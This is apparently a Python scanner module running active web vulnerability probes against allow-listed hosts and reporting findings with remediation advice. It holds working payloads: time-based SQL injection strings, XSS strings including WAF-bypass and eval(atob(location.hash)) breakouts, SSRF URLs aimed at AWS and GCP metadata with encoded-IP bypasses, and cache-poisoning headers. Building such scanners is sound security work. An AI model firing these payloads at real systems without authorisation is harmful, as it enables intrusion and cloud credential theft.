"""Active baseline probes — deterministic active checks, $0 LLM cost.

These probes complement the passive recon pass and the LLM-driven OWASP
phases by running a small, fixed set of *active* attacks whose signature
is purely structural (not requiring LLM creativity to generate).

Why this exists
---------------
Bug bounty researchers report a steady drumbeat of vulnerabilities whose
exploitation pattern is deterministic but whose *injection point* falls
outside the LLM's natural attack reasoning. Two examples:

1. **Bare-root quote-escape SQLi** (Avira, May-2026 report). Vulnerability
   is in the URL query string of the bare root path with no named
   parameter:

   .. code-block:: text

       GET /?"+IF(LENGTH(DATABASE())=8,SLEEP(5),NULL)+"&x=1

   Backend concatenates the raw query string into a SQL literal. The
   LLM-driven SQLi phase looks for ``?id=`` / ``?search=`` style named
   parameters and never tries the bare-root pattern. This module runs
   that probe deterministically for every in-scope host.

2. (future) Bare-root XXE / SSRF / HTTP-smuggling probes follow the same
   pattern and can plug into the same scaffold.

Cost / safety
-------------
- Probes are time-based blind: send 1 control + 4 short payloads per
  host, time the responses, flag any payload whose elapsed time is
  ``>= control + 3.0s`` AND ``>= 4.0s`` absolute. Threshold tuned to
  ride out network jitter while still catching ``SLEEP(5)``.
- A single re-test confirms a hit before reporting (rules out a transient
  network slowdown).
- Per-host budget: ~5–6 requests, ~20 seconds in the worst case (one
  full SLEEP(5) hit). For a 10-host scope: ~60 requests, ~3 minutes.
- Probes ONLY hit hosts that are already in the scanner's allow-list —
  this module never expands scope.
- Skipped entirely when ``scan_profile == "crawl_only"`` (fuzz traffic
  is forbidden in crawl-only).

This module is intentionally orthogonal to ``passive_recon.py``:
- passive_recon = no payloads, no fuzz, no SLEEP probes
- active_baseline = a tightly scoped set of deterministic active probes
  that the LLM phase would not reliably generate on its own
"""
from __future__ import annotations

import asyncio
import logging
import time
from typing import Iterable
from urllib.parse import urlparse

logger = logging.getLogger(__name__)

# ── Bare-root SQLi probe payloads ──────────────────────────────────────
# Each tuple: (label, raw_query_string). The query string is appended to
# the host root using the bug-bounty report shape:
# ``GET /?<query>?ninjeee=sectest`` (note the second ``?``).
# This keeps the payload as the FIRST query token (so a backend that
# concatenates only the raw query gets the injection at the start of its
# SQL literal) while still adding a deterministic marker.
#
# All payloads expect MySQL-flavour ``SLEEP(5)``. Postgres / MSSQL
# variants are tested too so the probe can fire across DB vendors.
_SLEEP_SECONDS = 5
_BARE_ROOT_PAYLOADS: list[tuple[str, str]] = [
    # Avira-style: double-quote escape, MySQL conditional
    ("mysql_dquote_if",
     '"+IF(LENGTH(DATABASE())%3E0,SLEEP(5),NULL)+"'),
    # Single-quote variant (more common but still rare on bare-root)
    ("mysql_squote_if",
     "%27+IF(LENGTH(DATABASE())%3E0,SLEEP(5),NULL)+%27"),
    # Classic OR-SLEEP — works when the raw query is concatenated into a
    # WHERE clause without any quote wrapping at all
    ("mysql_bool_or_sleep",
     "%27+OR+SLEEP(5)--+-"),
    # Postgres pg_sleep variant
    ("postgres_pg_sleep",
     "%27%3BSELECT+pg_sleep(5)--+-"),
]

# Threshold tuning. Time-based blind SQLi requires the SLEEP to fire AND
# the network jitter to stay below the gap. With SLEEP(5):
#   control ~= 0.5s, attack ~= 5.5s -> delta ~= 5.0s. Comfortable.
# With slow targets (TLS handshake on first hit, geo-distant CDN):
#   control ~= 2.0s, attack ~= 7.0s -> delta ~= 5.0s. Still fine.
# A 3.0s minimum delta plus a 4.0s absolute floor rules out:
#   - a re-handshake making one request 2s slower (delta 2s, no fire)
#   - a slow-but-uniform endpoint (control 4s, attack 4.2s, no fire)
_DELTA_THRESHOLD_S = 3.0
_ABSOLUTE_THRESHOLD_S = 4.0
_REQUEST_TIMEOUT_S = 15.0   # > SLEEP_SECONDS + 5s tolerance
_PER_HOST_CAP_S = 60.0      # circuit-breaker: stop probing a host that's slow

# These headers mirror the bug-bounty PoC enough to avoid some edge-layer
# bot/WAF blocks that otherwise return an immediate 403 before the origin
# app is reached (which would mask a real time-based delay signal).
_PROBE_HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
    ),
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
    "Accept-Encoding": "identity",
    "X-BugBounty": "1",
    "X-Intigriti-Username": "1",
}


async def _timed_get(http_client, url: str) -> tuple[float, int | None]:
    """Send a single GET and return (elapsed_seconds, status_code).

    Returns ``(_REQUEST_TIMEOUT_S + 1.0, None)`` on timeout or transport
    error so the caller treats it as "took too long" without raising.
    """
    started = time.perf_counter()
    try:
        # Do NOT follow redirects. Vulnerable origins can still introduce a
        # delay before responding with a redirect; following it would hide
        # the delay from this measurement.
        resp = await http_client.get(
            url,
            timeout=_REQUEST_TIMEOUT_S,
            follow_redirects=False,
            headers=_PROBE_HEADERS,
        )
        elapsed = time.perf_counter() - started
        return elapsed, resp.status_code
    except Exception as exc:  # network, timeout, TLS, anything
        elapsed = time.perf_counter() - started
        logger.debug("bare-root probe transport error on %s: %s", url, exc)
        # Cap elapsed so we don't accidentally flag a 30s timeout as a
        # SQLi hit — return the failure threshold + 1 as a sentinel.
        return _REQUEST_TIMEOUT_S + 1.0, None


def _build_finding(
    *, host: str, payload_label: str, raw_query: str,
    control_elapsed: float, attack_elapsed: float,
    confirmed: bool,
) -> dict:
    """Render a structured AI-Raw finding dict for a confirmed hit."""
    full_url = f"https://{host}/?{raw_query}%3Fninjeee%3Dsectest"
    decoded = (
        raw_query
        .replace("%27", "'")
        .replace("%3B", ";")
        .replace("%3E", ">")
        .replace("+", " ")
    )
    severity = "Critical"
    confidence = "High" if confirmed else "Medium"
    return {
        "title": "Blind Time-Based SQL Injection in Bare Query String",
        "severity": severity,
        "confidence": confidence,
        "owasp_category": "A03:2021",
        "cwe": "CWE-89",
        "url": full_url,
        "parameter": "(raw query string)",
        "payload": decoded,
        "evidence": (
            f"Control GET https://{host}/?ninjeee=sectest returned in "
            f"{control_elapsed:.2f}s. "
            f"Attack GET https://{host}/?{decoded}?ninjeee=sectest returned in "
            f"{attack_elapsed:.2f}s "
            f"(delta {attack_elapsed - control_elapsed:.2f}s). "
            f"SLEEP({_SLEEP_SECONDS}) was triggered, indicating the raw "
            f"query string is concatenated into a SQL literal on the "
            f"server. Confirmed={confirmed}."
        ),
        "remediation": (
            "Do not concatenate the raw query string into SQL. Use "
            "parameterized queries / prepared statements. If the backend "
            "must accept a raw query string, validate against an "
            "allow-list and strip SQL metacharacters before "
            "interpolation."
        ),
        "phase": "Active Baseline (Bare-Root SQLi)",
        "tool": "active_baseline.bare_root_sqli_probe",
        "_finding_source": "active_baseline",
        "_payload_label": payload_label,
    }


def _normalize_hosts(hosts: Iterable[str]) -> list[str]:
    """Take any mix of URLs / hostnames and return a deduped, sorted
    list of bare hostnames (no scheme, no path, no query)."""
    seen: set[str] = set()
    result: list[str] = []
    for h in hosts or []:
        if not h:
            continue
        h = str(h).strip()
        if not h:
            continue
        if "://" in h:
            parsed = urlparse(h)
            host = (parsed.hostname or "").strip().lower()
        else:
            host = h.split("/", 1)[0].split(":", 1)[0].strip().lower()
        if not host or host in seen:
            continue
        seen.add(host)
        result.append(host)
    result.sort()
    return result


async def run_bare_root_sqli_probe(
    http_client,
    hosts: Iterable[str],
    *,
    on_finding: callable | None = None,
    on_progress: callable | None = None,
    cancel_flag=None,
) -> list[dict]:
    """Probe every host's bare root URL for time-based blind SQLi.

    For each host:
      1. Send control ``GET https://<host>/?ninjeee=sectest`` and record elapsed.
      2. For each payload, send ``GET https://<host>/?<payload>?ninjeee=sectest``
         and record elapsed.
      3. If any attack >= control + 3.0s AND >= 4.0s absolute, send the
         attack a second time to rule out network jitter.
      4. If the second attempt also >= control + 3.0s, emit a Critical
         SQLi finding.

    Args:
        http_client: an httpx.AsyncClient (or compatible) already
            configured with the scanner's user agent / cookies / TLS
            settings.
        hosts: iterable of hostnames or URLs in scope. Anything outside
            this list is left alone — we never expand scope.
        on_finding: optional callback invoked with each finding dict.
        on_progress: optional callback ``(event_name, data_dict)`` for
            live progress reporting (mirrors passive_recon's pattern).
        cancel_flag: optional ``threading.Event`` — checked between hosts
            so a user-initiated stop drops out cleanly without finishing
            the remaining probes.

    Returns:
        list[dict] of finding dicts. Empty list if nothing fires.
    """
    findings: list[dict] = []
    _emit = on_finding or (lambda f: None)
    _progress = on_progress or (lambda event, data: None)

    targets = _normalize_hosts(hosts)
    if not targets:
        _progress("active_baseline_skip",
                  {"reason": "no in-scope hosts to probe"})
        return findings

    _progress("active_baseline_start", {
        "probe": "bare_root_sqli",
        "hosts": len(targets),
        "payloads_per_host": len(_BARE_ROOT_PAYLOADS),
        "sleep_seconds": _SLEEP_SECONDS,
    })

    seen_keys: set[tuple[str, str]] = set()

    for host in targets:
        if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
            _progress("active_baseline_cancel", {"host": host})
            break

        host_started = time.perf_counter()

        control_url = f"https://{host}/?ninjeee=sectest"
        control_elapsed, control_status = await _timed_get(http_client, control_url)
        if control_status is None:
            _progress("active_baseline_step", {
                "host": host, "step": "control_failed",
                "elapsed_s": round(control_elapsed, 3),
            })
            continue

        for label, payload in _BARE_ROOT_PAYLOADS:
            if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
                break
            if (time.perf_counter() - host_started) > _PER_HOST_CAP_S:
                _progress("active_baseline_step", {
                    "host": host, "step": "host_budget_exceeded",
                })
                break
            attack_url = f"https://{host}/?{payload}%3Fninjeee%3Dsectest"
            attack_elapsed, attack_status = await _timed_get(http_client, attack_url)
            if attack_status is None:
                # Transport / TLS / DNS error - NOT a SQLi signal even if
                # the timer ran long. Skip this payload silently.
                _progress("active_baseline_step", {
                    "host": host, "step": "probe_failed", "label": label,
                    "elapsed_s": round(attack_elapsed, 3),
                })
                continue
            delta = attack_elapsed - control_elapsed
            _progress("active_baseline_step", {
                "host": host, "step": "probe", "label": label,
                "control_s": round(control_elapsed, 3),
                "attack_s": round(attack_elapsed, 3),
                "delta_s": round(delta, 3),
            })

            if delta < _DELTA_THRESHOLD_S or attack_elapsed < _ABSOLUTE_THRESHOLD_S:
                continue

            await asyncio.sleep(0.5)
            confirm_elapsed, confirm_status = await _timed_get(http_client, attack_url)
            if confirm_status is None:
                # Confirmation transport failure - refuse to claim a hit
                # without a clean second measurement.
                _progress("active_baseline_step", {
                    "host": host, "step": "confirm_failed", "label": label,
                    "elapsed_s": round(confirm_elapsed, 3),
                })
                continue
            confirm_delta = confirm_elapsed - control_elapsed
            confirmed = (
                confirm_delta >= _DELTA_THRESHOLD_S
                and confirm_elapsed >= _ABSOLUTE_THRESHOLD_S
            )
            _progress("active_baseline_step", {
                "host": host, "step": "confirm", "label": label,
                "confirm_s": round(confirm_elapsed, 3),
                "confirm_delta_s": round(confirm_delta, 3),
                "confirmed": confirmed,
            })
            if not confirmed:
                continue

            key = (host, label)
            if key in seen_keys:
                continue
            seen_keys.add(key)

            f = _build_finding(
                host=host, payload_label=label, raw_query=payload,
                control_elapsed=control_elapsed,
                attack_elapsed=attack_elapsed,
                confirmed=True,
            )
            findings.append(f)
            _emit(f)

    _progress("active_baseline_end", {
        "probe": "bare_root_sqli",
        "hosts": len(targets),
        "findings": len(findings),
    })
    return findings


# ═══════════════════════════════════════════════════════════════════════
# GAP 2 — Web Cache Poisoning Probe
# ═══════════════════════════════════════════════════════════════════════
#
# Bug bounty researchers find cache poisoning by injecting headers like
# X-Forwarded-Host that get reflected into cached responses (Location
# redirect, meta refresh, asset URLs).  This probe:
#   1. Sends a normal GET, records the response body/headers.
#   2. Sends the same GET with poisoning headers containing a unique canary.
#   3. If the canary appears in the response body or Location header,
#      the app is reflecting unkeyed inputs — potential cache poisoning.
#   4. Fetches the URL again WITHOUT the header to see if the poisoned
#      response was cached (canary still present → confirmed).

_CACHE_POISON_HEADERS: list[tuple[str, str]] = [
    ("X-Forwarded-Host", "{canary}"),
    ("X-Host", "{canary}"),
    ("X-Original-URL", "/{canary}"),
    ("X-Rewrite-URL", "/{canary}"),
    ("X-Forwarded-Scheme", "nothttps"),
    ("X-Forwarded-Port", "1337"),
    ("X-Forwarded-Prefix", "/{canary}"),
]


async def run_cache_poisoning_probe(
    http_client,
    hosts: Iterable[str],
    *,
    on_finding: callable | None = None,
    on_progress: callable | None = None,
    cancel_flag=None,
) -> list[dict]:
    """Probe each host for web cache poisoning via unkeyed header reflection."""
    findings: list[dict] = []
    _emit = on_finding or (lambda f: None)
    _progress = on_progress or (lambda event, data: None)

    targets = _normalize_hosts(hosts)
    if not targets:
        return findings

    _progress("active_baseline_start", {
        "probe": "cache_poisoning", "hosts": len(targets),
    })

    import hashlib, os  # noqa: E401
    canary = f"cpcanary{hashlib.md5(os.urandom(4)).hexdigest()[:8]}"

    for host in targets:
        if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
            break
        base_url = f"https://{host}/"
        try:
            baseline_resp = await http_client.get(
                base_url, timeout=10.0, follow_redirects=False, headers=_PROBE_HEADERS,
            )
            baseline_body = baseline_resp.text[:50_000]
        except Exception:
            continue

        for hdr_name, hdr_tpl in _CACHE_POISON_HEADERS:
            if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
                break
            hdr_val = hdr_tpl.format(canary=canary)
            probe_headers = {**_PROBE_HEADERS, hdr_name: hdr_val}
            cache_buster = f"cb={hashlib.md5(os.urandom(4)).hexdigest()[:6]}"
            probe_url = f"{base_url}?{cache_buster}"
            try:
                probe_resp = await http_client.get(
                    probe_url, timeout=10.0, follow_redirects=False,
                    headers=probe_headers,
                )
            except Exception:
                continue

            reflected = False
            location = str(probe_resp.headers.get("location", ""))
            body = probe_resp.text[:50_000]
            if canary in body or canary in location:
                reflected = True

            if not reflected:
                continue

            _progress("active_baseline_step", {
                "host": host, "step": "cache_poison_reflected",
                "header": hdr_name, "canary": canary,
            })

            await asyncio.sleep(1.0)
            try:
                verify_resp = await http_client.get(
                    probe_url, timeout=10.0, follow_redirects=False,
                    headers=_PROBE_HEADERS,
                )
                verify_body = verify_resp.text[:50_000]
                verify_location = str(verify_resp.headers.get("location", ""))
                cached = canary in verify_body or canary in verify_location
            except Exception:
                cached = False

            severity = "High" if cached else "Medium"
            confidence = "High" if cached else "Medium"
            f = {
                "title": f"Web Cache Poisoning via {hdr_name}",
                "severity": severity,
                "confidence": confidence,
                "owasp_category": "A05:2021",
                "cwe": "CWE-444",
                "url": probe_url,
                "parameter": hdr_name,
                "payload": f"{hdr_name}: {hdr_val}",
                "evidence": (
                    f"Canary '{canary}' reflected in "
                    f"{'response body' if canary in body else 'Location header'} "
                    f"when sent via {hdr_name}. "
                    f"Cache verification: {'CACHED (confirmed poisoning)' if cached else 'not cached (reflection only)'}."
                ),
                "remediation": (
                    f"Ensure {hdr_name} is either stripped by the CDN/cache layer "
                    f"or included in the cache key. Validate and sanitize all "
                    f"host-related headers before reflecting them in responses."
                ),
                "phase": "Active Baseline (Cache Poisoning)",
                "tool": "active_baseline.cache_poisoning_probe",
                "_finding_source": "active_baseline",
            }
            findings.append(f)
            _emit(f)

    _progress("active_baseline_end", {
        "probe": "cache_poisoning", "findings": len(findings),
    })
    return findings


# ═══════════════════════════════════════════════════════════════════════
# GAP 3 — Reflected XSS Canary Probe
# ═══════════════════════════════════════════════════════════════════════
#
# Inject a unique canary string into common reflection points (query
# params, path segments, fragment). If reflected unencoded in the HTML
# body, escalate with actual XSS payloads including WAF bypass variants.

_XSS_CANARY_PREFIX = "xsscanary"

_XSS_INJECTION_POINTS: list[tuple[str, str]] = [
    ("query_q", "?q={canary}"),
    ("query_search", "?search={canary}"),
    ("query_name", "?name={canary}"),
    ("query_redirect", "?redirect={canary}"),
    ("query_url", "?url={canary}"),
    ("query_callback", "?callback={canary}"),
    ("query_next", "?next={canary}"),
    # Tile/asset-server style params (BUGB-3057 pattern: ipm-maptiles/?style=..&key=..)
    ("query_style", "?style={canary}"),
    ("query_key", "?key={canary}"),
    ("query_id", "?id={canary}"),
    ("query_page", "?page={canary}"),
    ("query_view", "?view={canary}"),
    ("query_theme", "?theme={canary}"),
    ("query_lang", "?lang={canary}"),
    ("query_locale", "?locale={canary}"),
    ("path_segment", "/{canary}"),
]

# HTML-context payloads: trigger when input lands inside the document body
# outside any quoted attribute / JS string.
_XSS_PAYLOADS: list[tuple[str, str]] = [
    ("basic_script", '<script>alert("XSS")</script>'),
    ("img_onerror", '<img src=x onerror=alert(1)>'),
    ("svg_onload", '<svg onload=alert(1)>'),
    ("waf_bypass_case", '<ScRiPt>alert(1)</ScRiPt>'),
    ("waf_bypass_encoding", '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>'),
    ("waf_bypass_double", '<<script>alert(1)//<</script>'),
    ("event_handler", '" onfocus=alert(1) autofocus="'),
    ("template_literal", '${alert(1)}'),
    ("js_uri", 'javascript:alert(1)'),
]

# JavaScript-string-context payloads: trigger when input lands inside an
# onclick=/onload=/<script> JS string literal. These break out of the
# string and inject code without using <, >, =, /, or = — bypassing the
# common "block angle brackets" WAF rule. Pattern from BUGB-3057
# (Avast ipm-maptiles /?style=...).
#
# Each tuple is (label, payload). The payload uses {C} as a placeholder
# for the canary token so we can detect "canary appeared as raw JS"
# (i.e. the string '-canary-' actually executed) versus "canary appeared
# encoded" (i.e. the app safely escaped it as &#39;).
_XSS_JS_CONTEXT_PAYLOADS: list[tuple[str, str]] = [
    # Single-quote breakout — exact BUGB-3057 shape.
    ("js_str_squote_break", "x')-{C}-('"),
    # Double-quote breakout — same pattern with " instead of '.
    ('js_str_dquote_break', 'x")-{C}-("'),
    # Backtick (template-literal) breakout — modern JS frameworks.
    ('js_str_backtick_break', "x`-{C}-`"),
    # Statement-terminator inside a JS string — drops out, runs canary
    # as a free identifier, and comments out the rest of the line.
    ('js_str_squote_terminator', "';{C};//"),
    ('js_str_dquote_terminator', '";{C};//'),
    # WAF bypass via location.hash — same shape as BUGB-3057's eval(atob())
    # exploit, but with canary as the identifier so we can detect
    # successful injection without actually executing arbitrary code.
    ('js_str_hash_eval_bypass', "x')-eval(atob(location.hash.slice(1)))/*{C}*/-('"),
]


# Regex patterns we use to decide *where* a canary landed in the response.
# We treat any of these contexts as "JS execution context":
#   1. inside <script>...canary...</script>
#   2. inside an event handler attribute  onclick="...canary..." (single or
#      double quoted; with or without leading/trailing whitespace)
#   3. inside an inline javascript: URI  href="javascript:...canary..."
_JS_CONTEXT_REGEXES = [
    # <script ...>...CANARY...</script>
    (r"<script\b[^>]*>[^<]*{C}[^<]*</script>", "script_block"),
    # onclick="...CANARY..."  (double-quoted attribute, may contain single quotes)
    (r"\bon[a-z]+\s*=\s*\"[^\"]*{C}[^\"]*\"", "event_handler_attr"),
    # onclick='...CANARY...'  (single-quoted attribute, may contain double quotes)
    (r"\bon[a-z]+\s*=\s*'[^']*{C}[^']*'", "event_handler_attr"),
    # href="javascript:...CANARY..." (double-quoted)
    (r"\bhref\s*=\s*\"\s*javascript:[^\"]*{C}[^\"]*\"", "javascript_uri"),
    # href='javascript:...CANARY...' (single-quoted)
    (r"\bhref\s*=\s*'\s*javascript:[^']*{C}[^']*'", "javascript_uri"),
]


def _classify_canary_context(body: str, canary: str) -> str | None:
    """Return one of {'script_block','event_handler_attr','javascript_uri',
    'html_body'} if the canary is reflected in that context, else None.

    Match priority is JS-context first (most dangerous), then plain HTML
    body. We don't fire on attribute-quoted reflections that aren't event
    handlers — those are usually safe (e.g. value="..."`).
    """
    if canary not in body:
        return None
    import re as _re
    for pattern_tpl, ctx_name in _JS_CONTEXT_REGEXES:
        pattern = pattern_tpl.replace("{C}", _re.escape(canary))
        if _re.search(pattern, body, _re.IGNORECASE | _re.DOTALL):
            return ctx_name
    # Canary present but not in a JS sink. Check it's at least in the
    # rendered HTML body (not just inside a quoted attribute we don't
    # care about). The simplest check: canary appears outside any tag.
    if _re.search(r">[^<]*" + _re.escape(canary) + r"[^<]*<", body):
        return "html_body"
    return None


async def run_reflected_xss_probe(
    http_client,
    hosts: Iterable[str],
    *,
    on_finding: callable | None = None,
    on_progress: callable | None = None,
    cancel_flag=None,
) -> list[dict]:
    """Probe each host for reflected XSS via canary injection + WAF bypass."""
    findings: list[dict] = []
    _emit = on_finding or (lambda f: None)
    _progress = on_progress or (lambda event, data: None)

    targets = _normalize_hosts(hosts)
    if not targets:
        return findings

    _progress("active_baseline_start", {
        "probe": "reflected_xss", "hosts": len(targets),
    })

    import hashlib, os  # noqa: E401
    canary = f"{_XSS_CANARY_PREFIX}{hashlib.md5(os.urandom(4)).hexdigest()[:8]}"

    for host in targets:
        if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
            break
        base_url = f"https://{host}"

        # Per-host: build a list of (param_label, tpl, ctx) where the
        # canary landed. ctx tells us which payload class to escalate
        # with (HTML body vs JS string).
        reflection_points: list[tuple[str, str, str]] = []
        for label, tpl in _XSS_INJECTION_POINTS:
            if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
                break
            test_url = f"{base_url}{tpl.format(canary=canary)}"
            try:
                resp = await http_client.get(
                    test_url, timeout=10.0, follow_redirects=True, headers=_PROBE_HEADERS,
                )
                ctx = _classify_canary_context(resp.text[:200_000], canary)
                if ctx:
                    reflection_points.append((label, tpl, ctx))
                    _progress("active_baseline_step", {
                        "host": host, "step": "xss_reflection_found",
                        "point": label, "context": ctx,
                    })
            except Exception:
                continue

        if not reflection_points:
            continue

        # Cap escalation work: 5 reflection points x payloads, first hit
        # per (point, context) is enough.
        for point_label, point_tpl, ctx in reflection_points[:5]:
            payloads_to_try: list[tuple[str, str]]
            if ctx in ("script_block", "event_handler_attr", "javascript_uri"):
                payloads_to_try = [
                    (lbl, tpl.replace("{C}", "alert(1)"))
                    for lbl, tpl in _XSS_JS_CONTEXT_PAYLOADS
                ]
            else:
                payloads_to_try = list(_XSS_PAYLOADS)

            for payload_label, payload in payloads_to_try:
                if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
                    break
                test_url = f"{base_url}{point_tpl.format(canary=payload)}"
                try:
                    resp = await http_client.get(
                        test_url, timeout=10.0, follow_redirects=True,
                        headers=_PROBE_HEADERS,
                    )
                    body = resp.text[:200_000]
                except Exception:
                    continue

                if payload not in body:
                    continue

                # JS-context findings are always Critical (direct code
                # execution); HTML-body findings are High.
                if ctx in ("script_block", "event_handler_attr", "javascript_uri"):
                    sev = "Critical"
                    title = f"Reflected XSS via JavaScript Context Breakout ({point_label}, {ctx})"
                    evidence = (
                        f"User input from parameter '{point_label}' is reflected "
                        f"unencoded inside a {ctx.replace('_', ' ')} on {host}. "
                        f"Payload '{payload_label}' (which contains no <, >, =, /, or "
                        f"comma — bypassing common WAF rules) successfully broke out "
                        f"of the JS string context: {payload}. "
                        f"Pattern matches BUGB-3057 (WAF-bypass JS-context reflection)."
                    )
                else:
                    sev = "High"
                    title = f"Reflected XSS via {point_label}"
                    evidence = (
                        f"Payload '{payload_label}' reflected unencoded in response "
                        f"body at {test_url}. The payload [{payload}] appears "
                        f"verbatim in the HTML response, confirming reflected XSS."
                    )

                f = {
                    "title": title,
                    "severity": sev,
                    "confidence": "High",
                    "owasp_category": "A03:2021",
                    "cwe": "CWE-79",
                    "url": test_url,
                    "parameter": point_label,
                    "payload": payload,
                    "evidence": evidence,
                    "remediation": (
                        "Context-aware escape user input before reflecting it. "
                        "For JS string contexts, JSON-encode and HTML-escape; "
                        "for HTML body, HTML-escape; for attribute values, "
                        "use attribute encoding. Implement a Content-Security-"
                        "Policy header to mitigate exploitation even if encoding "
                        "is missed."
                    ),
                    "phase": "Active Baseline (Reflected XSS)",
                    "tool": "active_baseline.reflected_xss_probe",
                    "_finding_source": "active_baseline",
                    "_payload_label": payload_label,
                    "_xss_context": ctx,
                }
                findings.append(f)
                _emit(f)
                break

    _progress("active_baseline_end", {
        "probe": "reflected_xss", "findings": len(findings),
    })
    return findings


# ═══════════════════════════════════════════════════════════════════════
# GAP 4 — SSRF Bypass Probe
# ═══════════════════════════════════════════════════════════════════════
#
# Test common SSRF bypass techniques: metadata endpoints with IP
# encoding variants, redirect chains, cloud provider metadata services.

_SSRF_INJECTION_POINTS: list[tuple[str, str]] = [
    ("query_url", "?url={payload}"),
    ("query_redirect", "?redirect={payload}"),
    ("query_next", "?next={payload}"),
    ("query_target", "?target={payload}"),
    ("query_dest", "?dest={payload}"),
    ("query_return", "?return_to={payload}"),
    ("query_callback", "?callback={payload}"),
    ("query_path", "?path={payload}"),
    ("query_proxy", "?proxy={payload}"),
    ("query_fetch", "?fetch={payload}"),
]

_SSRF_PAYLOADS: list[tuple[str, str, str]] = [
    ("aws_metadata_plain", "http://169.254.169.254/latest/meta-data/", "ami-id"),
    ("aws_metadata_hex", "http://0xa9fea9fe/latest/meta-data/", "ami-id"),
    ("aws_metadata_decimal", "http://2852039166/latest/meta-data/", "ami-id"),
    ("aws_metadata_ipv6", "http://[::ffff:169.254.169.254]/latest/meta-data/", "ami-id"),
    ("gcp_metadata", "http://metadata.google.internal/computeMetadata/v1/", "attributes"),
    ("localhost_127001", "http://127.0.0.1:80/", ""),
    ("localhost_hex", "http://0x7f000001/", ""),
    ("localhost_decimal", "http://2130706433/", ""),
    ("localhost_ipv6", "http://[::1]/", ""),
    ("localhost_short", "http://127.1/", ""),
    ("localhost_0000", "http://0.0.0.0/", ""),
]


async def run_ssrf_probe(
    http_client,
    hosts: Iterable[str],
    *,
    on_finding: callable | None = None,
    on_progress: callable | None = None,
    cancel_flag=None,
) -> list[dict]:
    """Probe each host for SSRF via URL parameter injection with bypass techniques."""
    findings: list[dict] = []
    _emit = on_finding or (lambda f: None)
    _progress = on_progress or (lambda event, data: None)

    targets = _normalize_hosts(hosts)
    if not targets:
        return findings

    _progress("active_baseline_start", {
        "probe": "ssrf_bypass", "hosts": len(targets),
    })

    for host in targets:
        if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
            break
        base_url = f"https://{host}"

        for point_label, point_tpl in _SSRF_INJECTION_POINTS:
            if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
                break
            benign_url = f"{base_url}{point_tpl.format(payload='https://example.com/')}"
            try:
                benign_resp = await http_client.get(
                    benign_url, timeout=10.0, follow_redirects=False,
                    headers=_PROBE_HEADERS,
                )
                benign_status = benign_resp.status_code
            except Exception:
                continue

            if benign_status in (404, 405, 501):
                continue

            for payload_label, payload_url, fingerprint in _SSRF_PAYLOADS:
                if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
                    break
                test_url = f"{base_url}{point_tpl.format(payload=payload_url)}"
                try:
                    resp = await http_client.get(
                        test_url, timeout=10.0, follow_redirects=False,
                        headers=_PROBE_HEADERS,
                    )
                    body = resp.text[:100_000]
                    status = resp.status_code
                except Exception:
                    continue

                is_ssrf = False
                evidence_detail = ""

                if fingerprint and fingerprint in body:
                    is_ssrf = True
                    evidence_detail = f"Cloud metadata fingerprint '{fingerprint}' found in response body."
                elif (status == 200 and benign_status != 200
                      and len(body) > 100
                      and "169.254" not in str(benign_resp.text[:1000])):
                    is_ssrf = True
                    evidence_detail = (
                        f"Status changed from {benign_status} (benign) to {status} (SSRF payload). "
                        f"Response body length: {len(body)} chars."
                    )

                if not is_ssrf:
                    continue

                f = {
                    "title": f"SSRF via {point_label} ({payload_label})",
                    "severity": "Critical" if "metadata" in payload_label else "High",
                    "confidence": "High" if fingerprint else "Medium",
                    "owasp_category": "A10:2021",
                    "cwe": "CWE-918",
                    "url": test_url,
                    "parameter": point_label,
                    "payload": payload_url,
                    "evidence": (
                        f"SSRF bypass payload '{payload_label}' ({payload_url}) "
                        f"injected via {point_label}. {evidence_detail}"
                    ),
                    "remediation": (
                        "Validate and sanitize all URL inputs server-side. "
                        "Use an allow-list of permitted domains/IPs. "
                        "Block requests to internal IP ranges (169.254.x.x, "
                        "127.x.x.x, 10.x.x.x, ::1, etc.) at the network level. "
                        "Disable cloud metadata access from application containers."
                    ),
                    "phase": "Active Baseline (SSRF Bypass)",
                    "tool": "active_baseline.ssrf_probe",
                    "_finding_source": "active_baseline",
                    "_payload_label": payload_label,
                }
                findings.append(f)
                _emit(f)
                break

    _progress("active_baseline_end", {
        "probe": "ssrf_bypass", "findings": len(findings),
    })
    return findings


__all__ = [
    "run_bare_root_sqli_probe",
    "run_cache_poisoning_probe",
    "run_reflected_xss_probe",
    "run_ssrf_probe",
]
